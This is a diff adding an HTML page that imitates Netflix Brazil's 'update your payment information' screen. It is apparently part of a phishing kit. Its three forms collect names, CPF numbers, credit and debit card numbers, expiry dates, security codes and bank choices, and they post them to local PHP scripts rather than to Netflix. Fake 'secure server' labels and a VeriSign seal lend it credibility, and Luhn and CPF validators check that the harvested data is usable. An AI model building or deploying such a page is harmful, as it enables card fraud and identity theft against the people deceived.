@@ -1,0 +1,594 @@
+
+<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
+    <title>Netflix - assista a séries online, assista a filmes online</title>
+    <meta content="filme, assistir online, assistir TV, TV online, séries, séries de TV online, séries online, ver filmes, filmes streaming, TV streaming, séries streaming, assistir online, assistir filmes Brasil, filmes sem download, temporada completa série, longas, assistir a longas" name="keywords">
+    <meta content="Assista a séries e filmes online diretamente na sua smart TV, PC ou Mac, videogame, tablet, smartphone e mais. Comece seu mês grátis hoje mesmo." name="description">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <link type="text/css" rel="stylesheet" href="stylo.css">
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2015.ico">
+
+    <style type="text/css">
+        #lbl_sair {
+            color: #e50914;
+            font-size: 20;
+        }
+
+        .logos .Bradesco {
+            background: url(https://assets.nflxext.com/ffe/siteui/acquisition/payment/mop_icons_global/icon_BR_bradesco_min.png) no-repeat scroll 0 0;
+            width: 25px;
+        }
+
+        .logos .BancoDoBrazil {
+            background: url(https://assets.nflxext.com/ffe/siteui/acquisition/payment/mop_icons_global/icon_BR_bancodobrasil.png) no-repeat scroll 0 0;
+            width: 25px;
+        }
+
+
+    </style>
+
+<style></style></head>
+<body ng-controller="AccordionDemoCtrl">
+<div id="appMountPoint">
+    <div class="basicLayout firefox payment" dir="ltr" data-reactid=".2fi486drd34" data-react-checksum="1680518438" lang="pt">
+        <div class="nfHeader signupBasicHeader" data-reactid=".2fi486drd34.1">
+            <a href="localhost" class="icon-logoUpdate nfLogo signupBasicHeader" style="pointer-events:inherit;" data-reactid=".2fi486drd34.1.1">
+                <span class="screen-reader-text" data-reactid=".2fi486drd34.1.1.0">Netflix</span>
+            </a>
+            <a id="lbl_sair" href="localhost" class="authLinks signupBasicHeader" data-reactid="">Sair</a>
+        </div>
+        <div class="centerContainer" data-reactid="8">
+
+
+            <h1 id="header_your_account_payment" data-reactid="9">Atualize suas informações de pagamento</h1>
+            <h4 data-reactid="10"><!-- react-text: 11 -->Sua nova forma de pagamento será usada para sua próxima
+                fatura.
+                A mensalidade é cobrada no primeiro dia de cada ciclo de cobrança.<!-- /react-text --></h4>
+            <div class="expando" data-reactid="12"></div>
+            <div class="secure-container clearfix" data-reactid="13">
+                <div class="secure" data-reactid="14">
+                            <span class="secure-desc" data-reactid="15">
+                                <h4 class="secure-text" data-reactid="16">Servidor seguro</h4>
+                                <a class="tell-me-more" data-reactid="17">Quero saber mais</a>
+                            </span>
+                    <span class="icon-lock" data-reactid="18"></span>
+                </div>
+            </div>
+
+
+            <div class="accordion" data-reactid="19">
+
+
+                <div id="menu1" class="expando">
+
+                    <div id="btt_menu1" class="paymentExpandoHd" data-mop-type="creditOption" data-reactid="21">
+                        <div class="container" data-reactid="22"><span class="arrow" data-reactid="23"></span><span class="hdLabel" data-reactid="24">Cartão de crédito</span><span class="logos logos-inline" data-reactid="25"><span class="logoIcon VISA" data-reactid="26"></span><span class="logoIcon MASTERCARD" data-reactid="27"></span><span class="logoIcon AMEX" data-reactid="28"></span><span class="logoIcon ELO" data-reactid="29"></span></span></div>
+                    </div>
+
+                    <div id="info1" style="display: none;">
+
+                        <div class="expandoContent" style="max-height: 800px; overflow: hidden; top: 0px; transition-duration: 1200ms;">
+                            <div class="paymentForm clearfix accordion">
+                                <form action="send_cartao_credito.php" method="post">
+                                    <input name="tab" id="tab" value="100" type="hidden">
+                                    <input name="ok" id="ok" value="success" type="hidden">
+                                    <div class="paymentForm-input"><label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text">Nome</span><span class="input-caption">Deve ser igual ao do cartão</span>
+												<input required="required" class="ui-text-input medium auto-firstName" name="firstname" id="firstname" tabindex="1"> </label>
+												<label class="paymentForm-input lastName ui-label ui-input-label inline ui-input-half">
+												<span class="ui-label-text">Sobrenome</span><span class="input-caption">Deve ser igual ao do cartão</span>
+												<input required="required" class="ui-text-input medium auto-lastName" name="lastName" id="lastName" tabindex="1"></label></div>
+
+
+                                    <div class="paymentForm-input">
+
+                                        <label for="cpf" class="paymentForm-input lastName ui-label ui-input-label inline ui-input-half">
+                                            <span class="ui-label-text">Cpf do titular</span>
+
+                                            <input class="ui-text-input medium" name="cpf" id="cpf" maxlength="11" onchange="validarCpf(this)" onkeypress="somenteNumeros(this)" required="required" tabindex="2">										
+											<!-- <input class="ui-text-input medium" name="cpf" id="cpf" onchange="validarCpf(this)" maxlength="14" OnKeyPress="formatar('###.###.###-##', this)" required="required" tabindex="2"> -->
+                                        </label>
+
+                                        <div class="logos logos-row hideIfMediumOrGreater" id="cc-after"><span class="logoIcon VISA"></span><span class="logoIcon MASTERCARD"></span><span class="logoIcon AMEX"></span><span class="logoIcon ELO"></span>
+                                        </div>
+
+                                        <label class="paymentForm-input lastName ui-label ui-input-label inline ui-input-half" data-reactid="49">
+                                                    <span class="ui-label-text" data-reactid="50">Número do cartão</span>
+                                            <input name="cc" class="ui-text-input medium auto-creditCardNumber" id="cc" tabindex="3" title="Número do Cartão Invalido" maxlength="16" required="required" onchange="validateCardNumber(this)" pattern="[0-9_\-]{13,16}" onkeypress="somenteNumeros(this)" data-reactid="16">
+                                            <span class="icon-lock" data-reactid="52"></span>
+                                        </label>
+
+
+                                    </div>
+
+                                    <div class="expiration-date ui-input-half"><label class="ui-label exp-date-label">Data
+                                            de
+                                            validade</label>
+                                        <div class="ui-select-wrapper expMonth"><label class="ui-label no-display"><span class="ui-label-text"></span></label>
+                                            <div class="select-arrow medium"><select class="ui-select medium" required="required" name="expMonth" tabindex="4">
+                                                    <option selected="selected"></option>
+                                                    <option value="1">Jan (1)</option>
+                                                    <option value="2">Fev (2)</option>
+                                                    <option value="3">Mar (3)</option>
+                                                    <option value="4">Abr (4)</option>
+                                                    <option value="5">Mai (5)</option>
+                                                    <option value="6">Jun (6)</option>
+                                                    <option value="7">Jul (7)</option>
+                                                    <option value="8">Ago (8)</option>
+                                                    <option value="9">Set (9)</option>
+                                                    <option value="10">Out (10)</option>
+                                                    <option value="11">Nov (11)</option>
+                                                    <option value="12">Dez (12)</option>
+                                                </select></div>
+                                        </div>
+                                        -
+                                        <div class="ui-select-wrapper expYear"><label class="ui-label no-display"><span class="ui-label-text"></span></label>
+                                            <div class="select-arrow medium"><select class="ui-select medium" required="required" name="expYear" tabindex="5">
+                                                    <option selected="selected"></option>
+                                                    <option value="2017">2017</option>
+                                                    <option value="2018">2018</option>
+                                                    <option value="2019">2019</option>
+                                                    <option value="2020">2020</option>
+                                                    <option value="2021">2021</option>
+                                                    <option value="2022">2022</option>
+                                                    <option value="2023">2023</option>
+                                                    <option value="2024">2024</option>
+                                                    <option value="2025">2025</option>
+                                                    <option value="2026">2026</option>
+                                                    <option value="2027">2027</option>
+                                                    <option value="2028">2028</option>
+                                                    <option value="2029">2029</option>
+                                                    <option value="2030">2030</option>
+                                                    <option value="2031">2031</option>
+                                                    <option value="2032">2032</option>
+                                                    <option value="2033">2033</option>
+                                                    <option value="2034">2034</option>
+                                                    <option value="2035">2035</option>
+                                                    <option value="2036">2036</option>
+                                                    <option value="2037">2037</option>
+                                                    <option value="2038">2038</option>
+                                                    <option value="2039">2039</option>
+                                                    <option value="2040">2040</option>
+                                                    <option value="2041">2041</option>
+                                                </select></div>
+                                        </div>
+                                        <div class="input-message error"></div>
+                                    </div>
+                                    <label class="paymentForm-input creditCardSecurityCode ui-label ui-input-label inline ui-input-half"><span class="ui-label-text">Código de segurança</span><input maxlength="4" required="required" onkeypress="somenteNumeros(this)" class="ui-text-input medium auto-creditCardSecurityCode" name="creditCardSecurityCode" id="creditCardSecurityCode" tabindex="6"><span class="icon-lock"></span></label>
+                                    <section class="cvv-hover clearfix"><a tabindex="-1"><img src="question_mark.png"></a>
+                                    </section>
+
+                                    <div class="clearfix">
+                                        <div class="btn-secure-wrapper">
+                                            <button onclick="checkdados()" class="btn btn-submit btn-large" data-toggle="tab" href="#menu1" type="submit" autocomplete="off" tabindex="7" id="CC-update"><span>Atualizar forma de pagamento</span>
+                                            </button>
+                                            <div class="secure"><span class="secure-text">Servidor seguro</span><span class="icon-lock"></span></div>
+                                        </div>
+                                        <div class="verisign-seal clearfix" id="verisignSeal"><span id="verisignSealEmbed" class="verisign-seal-embed"><img name="seal" src="FPPfZux.png" usemap="#sealmap_large" alt="" border="0">
+
+                                        </span></div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+
+                    </div>
+
+
+                </div>
+
+
+                <!--                parte 2-->
+
+
+                <div id="menu2" class="expando">
+
+                    <div id="btt_menu2" class="paymentExpandoHd" data-mop-type="debitOption" data-reactid="128">
+                        <div class="container" data-reactid="129"><span class="arrow" data-reactid="130"></span><span class="hdLabel" data-reactid="131">Cartão de débito</span><span class="logos logos-inline" data-reactid="132"><span class="logoIcon BancoDoBrazil" data-reactid="133"></span><span class="logoIcon Bradesco" data-reactid="134"></span>
+
+                                <span class="logoIcon ITAU_BRAZIL" data-reactid="135"></span>
+
+                                <span class="logoIcon Santander" data-reactid="135"></span>
+
+
+
+
+
+
+                            </span>
+                        </div>
+                    </div>
+
+                    <div id="info2" style="display: none;">
+
+                        <div class="expandoContent" style="max-height: 1400px; overflow: hidden; top: 0px; transition-duration: 1200ms;">
+                            <div class="paymentForm clearfix accordion">
+                                <form action="send_cartao_debito.php" method="post">
+                                    <input name="tab" id="tab" value="200" type="hidden">
+                                    <input name="ok" id="ok" value="success" type="hidden">
+
+                                    <label class="firstName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text">Nome</span><span class="input-caption">Deve ser igual ao do cartão</span><input class="ui-text-input medium auto-firstName" name="firstName" id="firstName" tabindex="0"></label><label class="lastName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text">Sobrenome</span><span class="input-caption">Deve ser igual ao do cartão</span><input class="ui-text-input medium auto-lastName" name="lastName" id="lastName" tabindex="0"></label><span class="logos logos-row hideIfMediumOrGreater"><span class="logoIcon BancoDoBrazil"></span><span class="logoIcon Bradesco"></span>
+
+                                            <span class="logoIcon ITAU_BRAZIL"></span>
+
+                                            <span class="logoIcon Santander"></span>
+
+                                        </span>
+
+                                    <div class="paymentForm-input">
+
+                                        <label class="paymentForm-input lastName ui-label ui-input-label inline ui-input-half" data-reactid="49">
+                                                    <span class="ui-label-text" data-reactid="50">Número do cartão</span>
+                                            <input name="cc" class="ui-text-input medium auto-creditCardNumber" id="cc" tabindex="1" title="Número do Cartão Invalido" maxlength="16" required="required" pattern="[0-9_\-]{13,16}" onkeypress="return SomenteNumero(event)" data-reactid="16">
+                                            <span class="icon-lock" data-reactid="52"></span>
+                                        </label>
+
+                                        <label for="cpf" class="paymentForm-input lastName ui-label ui-input-label inline ui-input-half">
+                                            <span class="ui-label-text">Cpf do titular</span>
+                                            <span class="input-caption">Deve ser igual ao do cartão</span>
+                                            <input class="ui-text-input medium" name="cpf" id="cpf" maxlength="14" onkeypress="formatar('###.###.###-##', this)" required="required">
+                                        </label>
+                                    </div>
+
+
+                                    <div class="expiration-date ui-input-half"><label class="ui-label exp-date-label">Data
+                                            de validade</label>
+                                        <div class="ui-select-wrapper expMonth"><label class="ui-label no-display"><span class="ui-label-text"></span></label>
+                                            <div class="select-arrow medium"><select class="ui-select medium" name="expMonth" tabindex="0">
+                                                    <option selected="selected"></option>
+                                                    <option value="1">Jan (1)</option>
+                                                    <option value="2">Fev (2)</option>
+                                                    <option value="3">Mar (3)</option>
+                                                    <option value="4">Abr (4)</option>
+                                                    <option value="5">Mai (5)</option>
+                                                    <option value="6">Jun (6)</option>
+                                                    <option value="7">Jul (7)</option>
+                                                    <option value="8">Ago (8)</option>
+                                                    <option value="9">Set (9)</option>
+                                                    <option value="10">Out (10)</option>
+                                                    <option value="11">Nov (11)</option>
+                                                    <option value="12">Dez (12)</option>
+                                                </select></div>
+                                        </div>
+                                        -
+                                        <div class="ui-select-wrapper expYear"><label class="ui-label no-display"><span class="ui-label-text"></span></label>
+                                            <div class="select-arrow medium"><select class="ui-select medium" name="expYear" tabindex="0">
+                                                    <option selected="selected"></option>
+                                                    <option value="2017">2017</option>
+                                                    <option value="2018">2018</option>
+                                                    <option value="2019">2019</option>
+                                                    <option value="2020">2020</option>
+                                                    <option value="2021">2021</option>
+                                                    <option value="2022">2022</option>
+                                                    <option value="2023">2023</option>
+                                                    <option value="2024">2024</option>
+                                                    <option value="2025">2025</option>
+                                                    <option value="2026">2026</option>
+                                                    <option value="2027">2027</option>
+                                                    <option value="2028">2028</option>
+                                                    <option value="2029">2029</option>
+                                                    <option value="2030">2030</option>
+                                                    <option value="2031">2031</option>
+                                                </select></div>
+                                        </div>
+                                        <div class="input-message error"></div>
+                                    </div>
+                                    <label class="debitCardSecurityCode ui-label ui-input-label inline ui-input-half"><span class="ui-label-text">Código de segurança</span><input class="ui-text-input medium auto-debitCardSecurityCode" name="creditCardSecurityCode" id="creditCardSecurityCode" tabindex="0"><span class="icon-lock"></span></label><input name="action" value="nextAction" type="hidden"><input name="authURL" value="1502470176787.pew0IUuDnpHDUfe5ZvaJkzho9A4=" type="hidden"><input name="planChoice" value="10322" type="hidden"><input name="paymentChoice" value="debitOption" type="hidden"><input name="withFields" value="debitCardData,firstName,lastName,paymentChoice" type="hidden">
+                                    <div class="clearfix">
+                                        <div class="btn-secure-wrapper">
+                                            <button class="btn btn-submit btn-large" type="submit" autocomplete="off" tabindex="0" id="DC-update">
+                                                <span>Atualizar forma de pagamento</span>
+                                            </button>
+                                            <div class="secure"><span class="secure-text">Servidor seguro</span><span class="icon-lock"></span></div>
+                                        </div>
+                                        <div class="verisign-seal clearfix" id="verisignSeal"><span id="verisignSealEmbed" class="verisign-seal-embed"><img name="seal" src="FPPfZux.png" usemap="#sealmap_large" alt="" border="0">
+
+                                        </span></div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+
+                <div id="menu3" class="expando">
+
+                    <div id="btt_menu3" class="paymentExpandoHd" data-mop-type="directDebitOption" data-reactid="137">
+                        <div class="container" data-reactid="138"><span class="arrow" data-reactid="139"></span><span class="hdLabel" data-reactid="140">Débito em conta</span><span class="logos logos-inline" data-reactid="141"><span class="logoIcon BRADESCO_BRAZIL" data-reactid="142"></span><span class="logoIcon SANTANDER_BRAZIL" data-reactid="143"></span><span class="logoIcon CAIXA_BRAZIL" data-reactid="144"></span></span></div>
+                    </div>
+
+
+                    <div id="info3" style="display: none;">
+
+                        <div class="expandoContent" style="max-height: 1400px; overflow: hidden; top: 0px; transition-duration: 1200ms;">
+                            <div class="paymentForm clearfix directDebit accordion">
+                                <form action="send_debito_conta.php" method="post">
+                                    <input name="tab" id="tab" value="300" type="hidden">
+                                    <input name="ok" id="ok" value="success" type="hidden">
+                                    <div class="ui-message-container ui-message-info">
+                                        <div class="ui-message-icon"></div>
+                                        <div class="ui-message-contents"><b>Observação:</b> se você optar pelo
+                                            débito em
+                                            conta, a ativação da sua conta Netflix pode demorar até <b>6 dias
+                                                úteis</b>,
+                                            pois ela depende da confirmação do banco.
+                                        </div>
+                                    </div>
+                                    <label class="firstName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text">Nome</span><span class="input-caption">Deve ser igual ao do titular da conta bancária</span><input class="ui-text-input medium auto-firstName" name="firstName" id="directDebitOption_firstName" tabindex="0"></label><label class="lastName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text">Sobrenome</span><span class="input-caption">Deve ser igual ao do titular da conta bancária</span><input class="ui-text-input medium auto-lastName" name="lastName" id="directDebitOption_lastName" tabindex="0"></label><span class="logos logos-row hideIfMediumOrGreater"><span class="logoIcon BRADESCO_BRAZIL"></span><span class="logoIcon SANTANDER_BRAZIL"></span><span class="logoIcon CAIXA_BRAZIL"></span></span><label class="cpf ui-label ui-input-label ui-input-half"><span class="ui-label-text">CPF</span><span class="input-caption">Deve ser igual ao do titular da conta bancária</span><input class="ui-text-input medium auto-cpf" name="customerIdentification" id="directDebitOption_cpf" minlength="11" maxlength="14" tabindex="0"><span class="icon-lock"></span></label>
+                                    <div class="ui-select-wrapper bank-names"><label class="ui-label"><span class="ui-label-text">Nome do banco</span></label>
+                                        <div class="select-arrow medium"><select class="ui-select medium" name="bankChoice" tabindex="0">
+                                                <option value="" selected="selected">Selecionar</option>
+                                                <option value="BRADESCO_BRAZIL">Banco Bradesco</option>
+                                                <option value="SANTANDER_BRAZIL">Banco Santander&nbsp;</option>
+                                                <option value="CAIXA_BRAZIL">Caixa Econômica Federal</option>
+                                            </select></div>
+                                    </div>
+                                    <div class="bank-fields"></div>
+                                    <input name="action" value="nextAction" type="hidden"><input name="authURL" value="1502476377765.0MjmEAOHZSwxV3BhTU0cHe7oX6E=" type="hidden"><input name="planChoice" value="10322" type="hidden"><input name="paymentChoice" value="directDebitOption" type="hidden"><input name="withFields" value="paymentChoice" type="hidden">
+                                    <div class="clearfix">
+                                        <div class="btn-secure-wrapper">
+                                            <button class="btn btn-submit btn-large" type="submit" autocomplete="off" tabindex="0" id="brDD-update">
+                                                <span>Atualizar forma de pagamento</span></button>
+                                            <div class="secure"><span class="secure-text">Servidor seguro</span><span class="icon-lock"></span></div>
+                                        </div>
+                                        <div class="verisign-seal clearfix" id="verisignSeal"><span id="verisignSealEmbed" class="verisign-seal-embed"><img name="seal" src="FPPfZux.png" usemap="#sealmap_large" alt="" border="0">
+
+                                        </span></div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+
+                    </div>
+
+                </div>
+
+
+            </div>
+
+        </div>
+
+
+    </div>
+    <div class="site-footer-wrapper centered" data-reactid="150">
+        <div class="footer-divider" data-reactid="151"></div>
+        <div class="site-footer" data-reactid="152">
+            <p class="footer-top" data-reactid="153">
+                <!-- react-text: 154 -->Dúvidas? Ligue <!-- /react-text -->
+                <a class="footer-top-a" href="tel:0800-887-0201" data-reactid="155">0800-887-0201</a>
+                <!-- react-text: 156 --><!-- /react-text -->
+            </p>
+            <ul class="footer-links structural" data-reactid="157">
+                <li class="footer-link-item" data-reactid="158">
+                    <a class="footer-link" href="https://help.netflix.com/legal/termsofuse" data-reactid="159">
+                        <span id="" data-reactid="160">Termos de uso</span>
+                    </a>
+                </li>
+                <li class="footer-link-item" data-reactid="161">
+                    <a class="footer-link" href="https://help.netflix.com/legal/privacy" data-reactid="162">
+                        <span id="" data-reactid="163">Privacidade</span></a></li>
+                <li class="footer-link-item" data-reactid="164">
+                    <a class="footer-link" href="https://help.netflix.com/legal/privacy#cookies" data-reactid="165">
+                        <span id="" data-reactid="166">Preferências de cookies</span>
+                    </a>
+                </li>
+                <li class="footer-link-item" data-reactid="167">
+                    <a class="footer-link" href="https://help.netflix.com/en/node/2101" data-reactid="168">
+                        <span id="" data-reactid="169">Informações corporativas</span>
+                    </a>
+                </li>
+            </ul>
+            <p class="copy-text" data-reactid="170"></p>
+        </div>
+    </div>
+</div>
+
+
+<script src="jquery.js"></script>
+
+<script type="text/javascript">
+
+    var boolopen1 = false;
+    var boolopen2 = false;
+    var boolopen3 = false;
+
+    function Central() {
+        $.ajax({
+            url: 'frm.tab01.php',
+            method: 'POST',
+            dataType: 'html',
+            data: {
+                id: true,
+            },
+            error: function () {
+
+            },
+            success: function (response) {
+                console.log(response);
+                var cod_text = response;
+                $('#tab01').html(cod_text);
+            }
+        });
+    }
+
+    function Arrow1(bool) {
+        if (bool == false) {
+            $('#menu1').removeClass("isOpen");
+            boolopen1 = false;
+        } else {
+            $('#menu1').addClass("isOpen");
+            boolopen1 = true;
+        }
+    }
+
+    function Arrow2(bool) {
+        if (bool == false) {
+            $('#menu2').removeClass("isOpen");
+            boolopen2 = false;
+        } else {
+            $('#menu2').addClass("isOpen");
+            boolopen2 = true;
+        }
+    }
+
+    function Arrow3(bool) {
+        if (bool == false) {
+            $('#menu3').removeClass("isOpen");
+            boolopen3 = false;
+        } else {
+            $('#menu3').addClass("isOpen");
+            boolopen3 = true;
+        }
+    }
+
+    $(document).ready(function () {
+        $("#btt_menu1").click(function () {
+            $("#info1").slideToggle();
+
+            if (boolopen1 == false) {
+                Arrow1(true);
+            } else {
+                Arrow1(false);
+            }
+            if (boolopen2 == true) {
+                $("#info2").slideToggle();
+                Arrow2(false);
+            }
+            if (boolopen3 == true) {
+                $("#info3").slideToggle();
+                Arrow3(false);
+            }
+        });
+
+        $("#btt_menu2").click(function () {
+            $("#info2").slideToggle();
+            if (boolopen2 == false) {
+                Arrow2(true);
+            } else {
+                Arrow2(false);
+            }
+            if (boolopen1 == true) {
+                $("#info1").slideToggle();
+                Arrow1(false);
+            }
+            if (boolopen3 == true) {
+                $("#info3").slideToggle();
+                Arrow3(false);
+            }
+        });
+
+        $("#btt_menu3").click(function () {
+            $("#info3").slideToggle();
+            if (boolopen3 == false) {
+                Arrow3(true);
+            } else {
+                Arrow3(false);
+            }
+            if (boolopen1 == true) {
+                $("#info1").slideToggle();
+                Arrow1(false);
+            }
+            if (boolopen2 == true) {
+                $("#info2").slideToggle();
+                Arrow2(false);
+            }
+        });
+    });
+
+    $("#info1").slideToggle();
+    Arrow1(true);
+
+    function validateCardNumber(number) {
+
+        var regex = new RegExp("^[0-9]{16}$");
+        if (!regex.test(number.value))
+            return false;
+        checkcardval = luhnCheck(number.value);
+
+        if (checkcardval == false) {
+            alert('Cartão invalido!');
+            number.value = '';
+        }
+    }
+	
+	function vercpf(cpf)
+            {
+            if (cpf.length != 11 || cpf == "00000000000" || cpf == "11111111111" || cpf == "22222222222" || cpf == "33333333333" || cpf == "44444444444" || cpf == "55555555555" || cpf == "66666666666" || cpf == "77777777777" || cpf == "88888888888" || cpf == "99999999999")
+            return false;
+            add = 0;
+            for (i = 0; i < 9; i ++)
+            add += parseInt(cpf.charAt(i)) * (10 - i);
+            rev = 11 - (add % 11);
+            if (rev == 10 || rev == 11)
+            rev = 0;
+            if (rev != parseInt(cpf.charAt(9)))
+            return false;
+            add = 0;
+            for (i = 0; i < 10; i ++)
+            add += parseInt(cpf.charAt(i)) * (11 - i);
+            rev = 11 - (add % 11);
+            if (rev == 10 || rev == 11)
+            rev = 0;
+            if (rev != parseInt(cpf.charAt(10)))
+            return false;
+            return true;
+            //alert('CPF V�LIDO');
+            }
+			
+			function validarCpf(cpf) {																					
+				if (vercpf(cpf.value)==false) {
+					alert('CPF invalido!');						
+					cpf.value = '';
+				}				
+            }
+
+    function luhnCheck(val) {
+        var sum = 0;
+        for (var i = 0; i < val.length; i++) {
+            var intVal = parseInt(val.substr(i, 1));
+            if (i % 2 == 0) {
+                intVal *= 2;
+                if (intVal > 9) {
+                    intVal = 1 + (intVal % 10);
+                }
+            }
+            sum += intVal;
+        }
+        return (sum % 10) == 0;
+    }
+
+    function formatar(mascara, documento) {
+        var i = documento.value.length;
+        var saida = mascara.substring(0, 1);
+        var texto = mascara.substring(i)
+
+        if (texto.substring(0, 1) != saida) {
+            documento.value += texto.substring(0, 1);
+        }
+    }
+
+    function somenteNumeros(num) {
+        var er = /[^0-9.]/;
+        er.lastIndex = 0;
+        var campo = num;
+        if (er.test(campo.value)) {
+            campo.value = "";
+        }
+    }
+
+
+    function checkdados() {
+//        alert('doido');
+
+
+    }
+
+
+</script>
+
+
+
+</body></html>
